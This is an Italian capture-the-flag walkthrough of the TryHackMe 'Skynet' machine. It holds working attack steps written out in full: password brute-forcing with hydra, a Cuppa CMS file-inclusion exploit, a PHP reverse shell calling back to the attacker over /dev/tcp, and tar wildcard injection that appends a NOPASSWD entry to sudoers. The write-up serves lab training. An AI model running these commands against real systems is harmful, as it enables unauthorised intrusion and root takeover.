
https://tryhackme.com/room/skynet

Riuscirai a compromettere questa macchina a tema Terminator?

```
nmap -Pn -v -p- 10.10.29.238
```
facciamo una scansione con nmap
```
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
110/tcp open  pop3
139/tcp open  netbios-ssn
143/tcp open  imap
445/tcp open  microsoft-ds
```

```
nmap -sVC -v -p22,80,110,139,143,445 10.10.29.238
```

```
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 99:23:31:bb:b1:e9:43:b7:56:94:4c:b9:e8:21:46:c5 (RSA)
|   256 57:c0:75:02:71:2d:19:31:83:db:e4:fe:67:96:68:cf (ECDSA)
|_  256 46:fa:4e:fc:10:a5:4f:57:57:d0:6d:54:f6:c3:4d:fe (ED25519)
80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Skynet
110/tcp open  pop3        Dovecot pop3d
|_pop3-capabilities: RESP-CODES TOP CAPA UIDL SASL AUTH-RESP-CODE PIPELINING
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143/tcp open  imap        Dovecot imapd
|_imap-capabilities: LITERAL+ more have LOGIN-REFERRALS Pre-login post-login capabilities listed ID OK IMAP4rev1 IDLE SASL-IR ENABLE LOGINDISABLEDA0001
445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: SKYNET; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| nbstat: NetBIOS name: SKYNET, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   SKYNET<00>           Flags: <unique><active>
|   SKYNET<03>           Flags: <unique><active>
|   SKYNET<20>           Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|_  WORKGROUP<1e>        Flags: <group><active>
|_clock-skew: mean: 1h40m00s, deviation: 2h53m12s, median: 0s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2025-09-23T12:56:08
|_  start_date: N/A
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: skynet
|   NetBIOS computer name: SKYNET\x00
|   Domain name: \x00
|   FQDN: skynet
|_  System time: 2025-09-23T07:56:08-05:00

```
ora controlliamo cosa troviamo su
```
http://10.10.29.238/
```

```
whatweb http://10.10.29.238/
```
```
┌──(root㉿kali)-[/home/kali/Downloads/Laboratori]
└─# whatweb http://10.10.29.238/
http://10.10.29.238/ [200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.10.29.238], Title[Skynet]                                                                       
                                                                                                                  
┌──(root㉿kali)-[/home/kali/Downloads/Laboratori]
└─#  echo "10.10.29.238   skynet.thm" >> /etc/hosts

```
aggiungiamo skynet al file hosts

```
echo "10.10.29.238   skynet.thm" >> /etc/hosts
```

```
http://skynet.thm/
```

facciamo un pò di enumerazione
```
gobuster dir -u http://skynet.thm/ -w /usr/share/wordlists/dirb/common.txt -t50
```
```
Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 275]
/.htpasswd            (Status: 403) [Size: 275]
/admin                (Status: 301) [Size: 308] [--> http://skynet.thm/admin/]
/config               (Status: 301) [Size: 309] [--> http://skynet.thm/config/]
/css                  (Status: 301) [Size: 306] [--> http://skynet.thm/css/]
/.hta                 (Status: 403) [Size: 275]
/index.html           (Status: 200) [Size: 523]
/js                   (Status: 301) [Size: 305] [--> http://skynet.thm/js/]
/server-status        (Status: 403) [Size: 275]
/squirrelmail         (Status: 301) [Size: 315] [--> http://skynet.thm/squirrelmail/]

```

```
http://skynet.thm/squirrelmail/
```
troviamo un form **SquirrelMail Login**

al momento  decido di enumerare le condivisioni Samba 

```
smbclient -L skynet.thm
```

```
└─# smbclient -L skynet.thm
Password for [WORKGROUP\root]:

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        anonymous       Disk      Skynet Anonymous Share
        milesdyson      Disk      Miles Dyson Personal Share
        IPC$            IPC       IPC Service (skynet server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            SKYNET
                                       
```
troviamo interessante anonymous ed IPC$

```
smbclient //skynet.thm/IPC$
```

```
dir
```
qui non ci sono oggetti proviamo anonymous
```
smbclient //skynet.thm/anonymous
```
```
└─# smbclient //skynet.thm/anonymous 
Password for [WORKGROUP\root]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Thu Nov 26 11:04:00 2020
  ..                                  D        0  Tue Sep 17 03:20:17 2019
  attention.txt                       N      163  Tue Sep 17 23:04:59 2019
  logs                                D        0  Wed Sep 18 00:42:16 2019

                9204224 blocks of size 1024. 5831036 blocks available
smb: \> 

```

scarichiamoci attention.txt
```
get attention.txt
```
controlliamo cosa troviamo nella cartella dei logs
```
cd logs
```
```
dir
```

```
smb: \> cd logs
smb: \logs\> dir
  .                                   D        0  Wed Sep 18 00:42:16 2019
  ..                                  D        0  Thu Nov 26 11:04:00 2020
  log2.txt                            N        0  Wed Sep 18 00:42:13 2019
  log1.txt                            N      471  Wed Sep 18 00:41:59 2019
  log3.txt                            N        0  Wed Sep 18 00:42:16 2019

```

scarichiamoci anche tutti i logs

```
get log1.txt
```

```
smb: \logs\> get log1.txt
getting file \logs\log1.txt of size 471 as log1.txt (2.2 KiloBytes/sec) (average 1.5 KiloBytes/sec)
smb: \logs\> get log2.txt
getting file \logs\log2.txt of size 0 as log2.txt (0.0 KiloBytes/sec) (average 1.1 KiloBytes/sec)
smb: \logs\> get log3.txt
getting file \logs\log3.txt of size 0 as log3.txt (0.0 KiloBytes/sec) (average 0.9 KiloBytes/sec)

```
a questo punto usciamo e vediamo il contenuto dei files scaricati
```
exit
```

```
cat attention.txt
```
```
└─# cat attention.txt      
A recent system malfunction has caused various passwords to be changed. All skynet employees are required to change their password after seeing this.
-Miles Dyson
```

```
cat log1.txt
```
```
cyborg007haloterminator
terminator22596
terminator219
terminator20
terminator1989
terminator1988
terminator168
terminator16
terminator143
terminator13
terminator123!@#
terminator1056
terminator101
terminator10
terminator02
terminator00
roboterminator
pongterminator
manasturcaluterminator
exterminator95
exterminator200
dterminator
djxterminator
dexterminator
determinator
cyborg007haloterminator
avsterminator
alonsoterminator
Walterminator
79terminator6
1996terminator
```

invece i file log2.txt e log3.txt sono vuoti!

il possibile nome utente è milesdyson e l'elenco ottenuto dovrebbero essere password

possiamo tentare un brute force su http://skynet.thm/squirrelmail/ ,utilizziamo Burp Suite o hydra

partiamo con Burp Suite e catturiamo la richiesta e la inviamo al repeater (mettiamo come user milesdyson e password 123456)
```
POST /squirrelmail/src/redirect.php HTTP/1.1
Host: skynet.thm
User-Agent: J
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 83
Origin: http://skynet.thm
Connection: keep-alive
Referer: http://skynet.thm/squirrelmail/src/login.php
Cookie: squirrelmail_language=en_US; SQMSESSID=q4bk87gqp4vjba1c052gpik6q2
Upgrade-Insecure-Requests: 1
Priority: u=0, i

login_username=milesdyson&secretkey=123456&js_autodetect_results=1&just_logged_in=1
```
ed inviamo la richiesta
```
Unknown user or password incorrect.
```

ora inviamo all'Intruder ed al posto della passvord selezioniamo la lista in log1.txt (Attacco a lista semplice)

ed avviamo l'attacco 

dopo pochissimo tra le risposte otteniamo
```
cyborg007haloterminator
```
come password valida!

stessa cosa l'avremmo ottenuta in questa maniera con hydra (sempre prendendo i parametri necessari per la richiesta da Burp Suite)

```
hydra -l milesdyson -P log1.txt skynet.thm -V http-form-post '/squirrelmail/src/redirect.php:login_username=milesdyson&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:F=Unknown User or password incorrect.'
```

Ora logghiamoci!

```
milesdyson
```
Qual è la password di Miles per le sue email?
```
cyborg007haloterminator
```

```
http://skynet.thm/squirrelmail/src/webmail.php
```
```

||skynet@skynet|Sep 17, 2019||[Samba Password reset](http://skynet.thm/squirrelmail/src/read_body.php?mailbox=INBOX&passed_id=3&startMessage=1)|
||   |   |   |   |
||serenakogan@skynet|Sep 17, 2019||[(no subject)](http://skynet.thm/squirrelmail/src/read_body.php?mailbox=INBOX&passed_id=2&startMessage=1)|
||   |   |   |   |
||serenakogan@skynet|Sep 17, 2019||[(no subject)](http://skynet.thm/squirrelmail/src/read_body.php?mailbox=INBOX&passed_id=1&startMessage=1)|
```

a password reset troviamo
```
We have changed your smb password after system malfunction.
Password: )s{A&2Z=F^n_E.B`
```
in serenakogan@skynet mail1
```
01100010 01100001 01101100 01101100 01110011 00100000 01101000 01100001 01110110
01100101 00100000 01111010 01100101 01110010 01101111 00100000 01110100 01101111
00100000 01101101 01100101 00100000 01110100 01101111 00100000 01101101 01100101
00100000 01110100 01101111 00100000 01101101 01100101 00100000 01110100 01101111
00100000 01101101 01100101 00100000 01110100 01101111 00100000 01101101 01100101
00100000 01110100 01101111 00100000 01101101 01100101 00100000 01110100 01101111
00100000 01101101 01100101 00100000 01110100 01101111 00100000 01101101 01100101
00100000 01110100 01101111
```
in serenakogan@skynet mail2
```
|   |
|---|
|i can i i everything else . . . . . . . . . . . . . .<br>balls have zero to me to me to me to me to me to me to me to me to<br>you i everything else . . . . . . . . . . . . . .<br>balls have a ball to me to me to me to me to me to me to me<br>i i can i i i everything else . . . . . . . . . . . . . .<br>balls have a ball to me to me to me to me to me to me to me<br>i . . . . . . . . . . . . . . . . . . .<br>balls have zero to me to me to me to me to me to me to me to me to<br>you i i i i i everything else . . . . . . . . . . . . . .<br>balls have 0 to me to me to me to me to me to me to me to me to<br>you i i i everything else . . . . . . . . . . . . . .<br>balls have zero to me to me to me to me to me to me to me to me to|
```

```
milesdyson@skynet.thm
```

Visto che abbiamo ottenuto una password enumeriamo di nuovo smb

```
smbclient -U milesdyson \\\\skynet.thm\\milesdyson
```
```
)s{A&2Z=F^n_E.B`
```

```
dir
```
otteniamo
```
smb: \> dir
  .                                   D        0  Tue Sep 17 05:05:47 2019
  ..                                  D        0  Tue Sep 17 23:51:03 2019
  Improving Deep Neural Networks.pdf      N  5743095  Tue Sep 17 05:05:14 2019
  Natural Language Processing-Building Sequence Models.pdf      N 12927230  Tue Sep 17 05:05:14 2019
  Convolutional Neural Networks-CNN.pdf      N 19655446  Tue Sep 17 05:05:14 2019
  notes                               D        0  Tue Sep 17 05:18:40 2019
  Neural Networks and Deep Learning.pdf      N  4304586  Tue Sep 17 05:05:14 2019
  Structuring your Machine Learning Project.pdf      N  3531427  Tue Sep 17 05:05:14 2019
```
abbiamo un bel po di pdf da controllare e dentro la cartella notes
```
cd notes
```
```
smb: \notes\> dir
  .                                   D        0  Tue Sep 17 05:18:40 2019
  ..                                  D        0  Tue Sep 17 05:05:47 2019
  3.01 Search.md                      N    65601  Tue Sep 17 05:01:29 2019
  4.01 Agent-Based Models.md          N     5683  Tue Sep 17 05:01:29 2019
  2.08 In Practice.md                 N     7949  Tue Sep 17 05:01:29 2019
  0.00 Cover.md                       N     3114  Tue Sep 17 05:01:29 2019
  1.02 Linear Algebra.md              N    70314  Tue Sep 17 05:01:29 2019
  important.txt                       N      117  Tue Sep 17 05:18:39 2019
  6.01 pandas.md                      N     9221  Tue Sep 17 05:01:29 2019
  3.00 Artificial Intelligence.md      N       33  Tue Sep 17 05:01:29 2019
  2.01 Overview.md                    N     1165  Tue Sep 17 05:01:29 2019
  3.02 Planning.md                    N    71657  Tue Sep 17 05:01:29 2019
  1.04 Probability.md                 N    62712  Tue Sep 17 05:01:29 2019
  2.06 Natural Language Processing.md      N    82633  Tue Sep 17 05:01:29 2019
  2.00 Machine Learning.md            N       26  Tue Sep 17 05:01:29 2019
  1.03 Calculus.md                    N    40779  Tue Sep 17 05:01:29 2019
  3.03 Reinforcement Learning.md      N    25119  Tue Sep 17 05:01:29 2019
  1.08 Probabilistic Graphical Models.md      N    81655  Tue Sep 17 05:01:29 2019
  1.06 Bayesian Statistics.md         N    39554  Tue Sep 17 05:01:29 2019
  6.00 Appendices.md                  N       20  Tue Sep 17 05:01:29 2019
  1.01 Functions.md                   N     7627  Tue Sep 17 05:01:29 2019
  2.03 Neural Nets.md                 N   144726  Tue Sep 17 05:01:29 2019
  2.04 Model Selection.md             N    33383  Tue Sep 17 05:01:29 2019
  2.02 Supervised Learning.md         N    94287  Tue Sep 17 05:01:29 2019
  4.00 Simulation.md                  N       20  Tue Sep 17 05:01:29 2019
  3.05 In Practice.md                 N     1123  Tue Sep 17 05:01:29 2019
  1.07 Graphs.md                      N     5110  Tue Sep 17 05:01:29 2019
  2.07 Unsupervised Learning.md       N    21579  Tue Sep 17 05:01:29 2019
  2.05 Bayesian Learning.md           N    39443  Tue Sep 17 05:01:29 2019
  5.03 Anonymization.md               N     2516  Tue Sep 17 05:01:29 2019
  5.01 Process.md                     N     5788  Tue Sep 17 05:01:29 2019
  1.09 Optimization.md                N    25823  Tue Sep 17 05:01:29 2019
  1.05 Statistics.md                  N    64291  Tue Sep 17 05:01:29 2019
  5.02 Visualization.md               N      940  Tue Sep 17 05:01:29 2019
  5.00 In Practice.md                 N       21  Tue Sep 17 05:01:29 2019
  4.02 Nonlinear Dynamics.md          N    44601  Tue Sep 17 05:01:29 2019
  1.10 Algorithms.md                  N    28790  Tue Sep 17 05:01:29 2019
  3.04 Filtering.md                   N    13360  Tue Sep 17 05:01:29 2019
  1.00 Foundations.md                 N       22  Tue Sep 17 05:01:29 2019

```
troviamo un file con scritto importante scarichiamocelo
```
get important.txt
```
exit
```
cat important.txt
```
```
┌──(root㉿kali)-[/home/kali/Downloads/Laboratori]
└─# cat important.txt

1. Add features to beta CMS /45kra24zxs28v3yd
2. Work on T-800 Model 101 blueprints
3. Spend more time with my wife

```

abbiamo probabilmente  trovato la cartella nascosta 

accediamo
```
http://skynet.thm/45kra24zxs28v3yd/
```

```
## Miles Dyson Personal Page

Dr. Miles Bennett Dyson was the original inventor of the neural-net processor which would lead to the development of Skynet,  
a computer A.I. intended to control electronically linked weapons and defend the United States.
```

Cos'è la directory nascosta?
```
/45kra24zxs28v3yd
```

Come si chiama la vulnerabilità che consente di includere un file remoto per scopi dannosi?
```
remote file inclusion
```

l'indizio del CMS e della cartella mi fa pensare a qualche altra dir nascosta
proviamo ad enumerare di nuovo includendo la dir appena trovata

```
gobuster dir --url http://skynet.thm/45kra24zxs28v3yd/ -w /usr/share/wordlists/dirb/common.txt -t50
```
```
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 275]
/.htaccess            (Status: 403) [Size: 275]
/.htpasswd            (Status: 403) [Size: 275]
/administrator        (Status: 301) [Size: 333] [--> http://skynet.thm/45kra24zxs28v3yd/administrator/]
/index.html           (Status: 200) [Size: 418]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished

```
troviamo
```
http://skynet.thm/45kra24zxs28v3yd/administrator/
```

```
whatweb http://skynet.thm/45kra24zxs28v3yd/administrator/
```
```
┌──(root㉿kali)-[/home/kali/Downloads/Laboratori]
└─# whatweb http://skynet.thm/45kra24zxs28v3yd/administrator/
http://skynet.thm/45kra24zxs28v3yd/administrator/ [200 OK] Apache[2.4.18], Cookies[PHPSESSID], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.10.29.238], JQuery, PasswordField[password], Script[text/javascript], Title[Cuppa CMS]
```
abbiamo a che fare con **Cuppa CMS** guardiamo in rete se troviamo vulnerabilità RFI (suggerimento della domanda precedente)

https://www.exploit-db.com/exploits/25971
breve descrizione
```
DESCRIPTION
#####################################################

Un aggressore potrebbe includere file PHP locali o remoti o leggere file non PHP con questa vulnerabilità. I ​​dati contaminati dall'utente vengono utilizzati durante la creazione del nome file che verrà incluso nel file corrente. Il codice PHP in questo file verrà valutato e il codice non PHP verrà incorporato nell'output. Questa vulnerabilità può portare alla compromissione completa del server.

http://target/cuppa/alerts/alertConfigField.php?urlConfig=[FI]

#####################################################
EXPLOIT
#####################################################

http://target/cuppa/alerts/alertConfigField.php?urlConfig=http://www.shell.com/shell.txt?
http://target/cuppa/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd

Moreover, We could access Configuration.php source code via PHPStream 

For Example:
-----------------------------------------------------------------------------
http://target/cuppa/alerts/alertConfigField.php?urlConfig=php://filter/convert.base64-encode/resource=../Configuration.php
```
quindi proviamo subito un path traversal
```
http://skynet.thm/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd
```
ed otteniamo
```
**Field configuration:**

root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false syslog:x:104:108::/home/syslog:/bin/false _apt:x:105:65534::/nonexistent:/bin/false lxd:x:106:65534::/var/lib/lxd/:/bin/false messagebus:x:107:111::/var/run/dbus:/bin/false uuidd:x:108:112::/run/uuidd:/bin/false dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin milesdyson:x:1001:1001:,,,:/home/milesdyson:/bin/bash dovecot:x:111:119:Dovecot mail server,,,:/usr/lib/dovecot:/bin/false dovenull:x:112:120:Dovecot login user,,,:/nonexistent:/bin/false postfix:x:113:121::/var/spool/postfix:/bin/false mysql:x:114:123:MySQL Server,,,:/nonexistent:/bin/false
```

Non possiamo ottenere il file shadow quindi creiamo un file php per ottenere una reverse shell
```
nano revshell.php
```
```
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.14.99.134/1234 0>&1'");
```

Avviamo un server web in python

```
python -m http.server 8000
```

Apriamo un'altro terminale dove ci mettiamo in ascolto attendendo la connessione della nostra rev shell
```
nc -lvnp 1234
```

ora o da browser o da terminale eseguiamo

```
http://skynet.thm/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://<attacker_ip>:8000/revshell.php
```
dove sostituiremo attacker_ip con il nostro dove abbiamo il server python

```
http://skynet.thm/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.14.99.134:8000/revshell.php
```
abbiamo ottenuto la nostra reverse shell
```
└─$ nc -lvnp 1234
listening on [any] 1234 ...
connect to [10.14.99.134] from (UNKNOWN) [10.10.29.238] 46468
bash: cannot set terminal process group (1195): Inappropriate ioctl for device
bash: no job control in this shell
www-data@skynet:/var/www/html/45kra24zxs28v3yd/administrator/alerts$ ls -al
ls -al
total 24
drwxr-xr-x 2 www-data www-data 4096 Nov  1  2011 .
drwxr-xr-x 8 www-data www-data 4096 Sep 17  2019 ..
-rw-r--r-- 1 www-data www-data 1212 Oct  3  2011 alertConfigField.php
-rw-r--r-- 1 www-data www-data 1269 Nov  1  2011 alertIFrame.php
-rw-r--r-- 1 www-data www-data 1819 Mar  3  2011 alertImage.php
-rw-r--r-- 1 www-data www-data 1343 Jul 11  2011 defaultAlert.php
www-data@skynet:/var/www/html/45kra24zxs28v3yd/administrator/alerts$ whoami
whoami
www-data
www-data@skynet:/var/www/html/45kra24zxs28v3yd/administrator/alerts$ 

```

e troviamo la flag utente in
```
www-data@skynet:/home/milesdyson$ ls -al
ls -al
total 36
drwxr-xr-x 5 milesdyson milesdyson 4096 Sep 17  2019 .
drwxr-xr-x 3 root       root       4096 Sep 17  2019 ..
lrwxrwxrwx 1 root       root          9 Sep 17  2019 .bash_history -> /dev/null
-rw-r--r-- 1 milesdyson milesdyson  220 Sep 17  2019 .bash_logout
-rw-r--r-- 1 milesdyson milesdyson 3771 Sep 17  2019 .bashrc
-rw-r--r-- 1 milesdyson milesdyson  655 Sep 17  2019 .profile
drwxr-xr-x 2 root       root       4096 Sep 17  2019 backups
drwx------ 3 milesdyson milesdyson 4096 Sep 17  2019 mail
drwxr-xr-x 3 milesdyson milesdyson 4096 Sep 17  2019 share
-rw-r--r-- 1 milesdyson milesdyson   33 Sep 17  2019 user.txt
www-data@skynet:/home/milesdyson$ cat user.txt
cat user.txt
7ce5c2109a40f958099283600a9ae807
```

per l'ultima flag dopo un po' di prove per scalare i privilegi tipo permessi suid etc, utilizziamo il suggerimento che ci dice stai cercando: una chiamata ricorsiva.

pensiamo quindi al crontab

```
cat /etc/crontab
```

```
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
*/1 *   * * *   root    /home/milesdyson/backups/backup.sh
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
www-data@skynet:/home/milesdyson$ 

```

c'è un file backup.sh in esecuzione ogni minuto

controlliamo i permessi del file

```
ls -al /home/milesdyson/backups/
```
```
drwxr-xr-x 2 root       root          4096 Sep 17  2019 .
drwxr-xr-x 5 milesdyson milesdyson    4096 Sep 17  2019 ..
-rwxr-xr-x 1 root       root            74 Sep 17  2019 backup.sh
-rw-r--r-- 1 root       root       4679680 Sep 23 11:05 backup.tgz

```

on abbiamo i permessi per rinominare il file
quindi controlliamo il contenuto del file backup.sh

```
cat /home/milesdyson/backups/backup.sh
```
```
#!/bin/bash
cd /var/www/html
tar cf /home/milesdyson/backups/backup.tgz *
```

Questo script viene eseguito come root, 
cambia directory in '/var/www/html' e poi usa tar per comprimere il contenuto della directory in un file chiamato backup.tgz in '/home/milesdyson/backups'.

 mi viene in mente qualcosa che ho già affrontato riguardo l'avvelenamento dei file tramite l'iniezione di caratteri jolly

buona occasione per un ripasso

prima di tutto ci spostiamo della cartella 
```
cd /var/www/html
```
(come accade nello script eseguito nel crontab)

**Opzioni di `tar` Utilizzate**
1. **checkpoint[=NUMBER]**: Questa opzione consente di visualizzare messaggi di progresso ogni NUMBER record (il valore predefinito è 10).
2. **checkpoint-action=ACTION**: Questa opzione esegue l'azione specificata ad ogni checkpoint.

**Strategia di Attacco**

**L'idea è di forzare `tar` a utilizzare queste opzioni in modo da eseguire un'azione con i privilegi dell'utente che esegue il comando, che in questo caso è root.**

Per sfruttare questa vulnerabilità, si crea uno script che aggiunge l'utente `www-data` al file `sudoers`, consentendogli di eseguire comandi come root senza password. Ecco i passaggi:


```
echo 'echo "www-data ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > sudo.sh
```

Questo comando crea un file chiamato `sudo.sh` che, quando eseguito, aggiunge l'utente `www-data` al file `sudoers`.
**Creazione dei File di Checkpoint**
```
touch "/var/www/html/--checkpoint-action=exec=sh sudo.sh"
```
```
touch "/var/www/html/--checkpoint=1"
```
Questi comandi creano due file nel percorso `/var/www/html`. Il primo file specifica che, ad ogni checkpoint, deve essere eseguito lo script `sudo.sh`, mentre il secondo file imposta il checkpoint stesso.

Dopo aver eseguito questi comandi, ci saranno tre nuovi file nella directory `/var/www/html` che `tar` sta eseguendo il backup. Quando `tar` viene eseguito, attiverà i checkpoint e, di conseguenza, eseguirà lo script `sudo.sh`, permettendo all'utente `www-data` di ottenere privilegi di root.

```
www-data@skynet:/var/www/html$ ls -al
ls -al
total 72
-rw-r--r-- 1 www-data www-data     0 Sep 23 11:57 --checkpoint-action=exec=sh sudo.sh
-rw-r--r-- 1 www-data www-data     0 Sep 23 11:57 --checkpoint=1
drwxr-xr-x 8 www-data www-data  4096 Sep 23 11:57 .
drwxr-xr-x 3 root     root      4096 Sep 17  2019 ..
drwxr-xr-x 3 www-data www-data  4096 Sep 17  2019 45kra24zxs28v3yd
drwxr-xr-x 2 www-data www-data  4096 Sep 17  2019 admin
drwxr-xr-x 3 www-data www-data  4096 Sep 17  2019 ai
drwxr-xr-x 2 www-data www-data  4096 Sep 17  2019 config
drwxr-xr-x 2 www-data www-data  4096 Sep 17  2019 css
-rw-r--r-- 1 www-data www-data 25015 Sep 17  2019 image.png
-rw-r--r-- 1 www-data www-data   523 Sep 17  2019 index.html
drwxr-xr-x 2 www-data www-data  4096 Sep 17  2019 js
-rw-r--r-- 1 www-data www-data  2667 Sep 17  2019 style.css
-rw-r--r-- 1 www-data www-data    57 Sep 23 11:57 sudo.sh
```

il cronjob dovrebbe essere eseguito dopo un minuto 
quindi possiamo ottenere l'accesso root semplicemente usando 
```
sudo su
```
siamo root!
```
www-data@skynet:/var/www/html$ sudo su
sudo su
whoami
root

```
ed ora recuperiamo la flag di root!
```
cd root
ls -al
total 28
drwx------  4 root root 4096 Sep 17  2019 .
drwxr-xr-x 23 root root 4096 Sep 18  2019 ..
lrwxrwxrwx  1 root root    9 Sep 17  2019 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Oct 22  2015 .bashrc
drwx------  2 root root 4096 Sep 17  2019 .cache
drwxr-xr-x  2 root root 4096 Sep 17  2019 .nano
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-r--r--  1 root root   33 Sep 17  2019 root.txt
cat root.txt
xxxxxxxxxxxxxxxxxxxxxxxxxx

```
Cos'è il flag radice?
```
xxxxxxxxxxxxxxxxxx
```